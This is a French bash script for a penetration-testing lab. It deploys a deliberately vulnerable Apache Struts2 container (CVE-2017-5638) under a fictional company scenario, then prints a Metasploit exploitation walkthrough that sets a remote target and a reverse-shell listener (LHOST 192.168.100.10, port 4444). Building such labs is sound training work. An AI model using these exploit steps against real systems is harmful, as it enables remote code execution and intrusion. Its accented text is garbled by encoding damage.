#!/bin/bash
set -e

echo "================================================"
echo "  SCRIPT FINAL - NETTOYAGE + STRUTS2"
echo "  √áa va marcher, point final."
echo "================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Lance avec sudo"
    exit 1
fi

# ========================================
# √âTAPE 1 : NETTOYAGE TOTAL
# ========================================

echo "[1/4] Nettoyage COMPLET des containers..."

# Arr√™ter tous les containers
docker stop phpmyadmin-vuln 2>/dev/null || true
docker stop webmin-vuln 2>/dev/null || true
docker stop struts2-vuln 2>/dev/null || true
docker stop mysql_db 2>/dev/null || true

# Supprimer tous les containers
docker rm phpmyadmin-vuln 2>/dev/null || true
docker rm webmin-vuln 2>/dev/null || true
docker rm struts2-vuln 2>/dev/null || true

echo "   ‚úÖ Nettoyage termin√©"

# ========================================
# √âTAPE 2 : INSTALLATION STRUTS2
# ========================================

echo "[2/4] T√©l√©chargement Struts2..."
docker pull vulnerables/cve-2017-5638

echo "[3/4] Lancement Struts2 sur port 8080..."
docker run -d \
    --name struts2-vuln \
    --restart unless-stopped \
    -p 8080:8080 \
    vulnerables/cve-2017-5638

echo "[4/4] V√©rification (15 secondes)..."
sleep 15

# ========================================
# V√âRIFICATION
# ========================================

if ! docker ps | grep -q struts2-vuln; then
    echo "‚ùå √âCHEC - Container non actif"
    docker logs struts2-vuln
    exit 1
fi

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)

if [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "302" ]; then
    echo "‚ùå √âCHEC - Application ne r√©pond pas (HTTP $HTTP_CODE)"
    exit 1
fi

SERVER_IP=$(hostname -I | awk '{print $1}')

# ========================================
# R√âSULTAT
# ========================================

echo ""
echo "================================================"
echo "  ‚úÖ STRUTS2 OP√âRATIONNEL !"
echo "================================================"
echo ""
docker ps | grep struts2
echo ""
echo "üìä Configuration:"
echo "   Application: Apache Struts2"
echo "   CVE: CVE-2017-5638 (OGNL RCE)"
echo "   Port: 8080"
echo "   URL: http://${SERVER_IP}:8080/"
echo "   HTTP Status: $HTTP_CODE"
echo ""
echo "================================================"
echo "  üî• EXPLOITATION METASPLOIT (DEPUIS KALI)"
echo "================================================"
echo ""
echo "msfconsole -q"
echo "use exploit/multi/http/struts2_content_type_ognl"
echo "set RHOSTS ${SERVER_IP}"
echo "set RPORT 8080"
echo "set TARGETURI /struts2-showcase/integration/saveGangster.action"
echo "set LHOST 192.168.100.10"
echo "set LPORT 4444"
echo "exploit"
echo ""
echo "SI L'EXPLOIT √âCHOUE, ESSAYE:"
echo "set TARGETURI /"
echo "exploit"
echo ""
echo "================================================"
echo "  üìñ SC√âNARIO LAB"
echo "================================================"
echo ""
echo "Iron4Software h√©berge un portail intranet Java"
echo "sur Apache Struts2 pour la gestion RH/admin."
echo "CVE-2017-5638: RCE via Content-Type OGNL injection"
echo "MITRE ATT&CK: T1190 (Exploit Public-Facing App)"
echo ""
echo "================================================"
echo "  ‚úÖ PR√äT POUR EXPLOITATION !"
echo "================================================"
echo ""
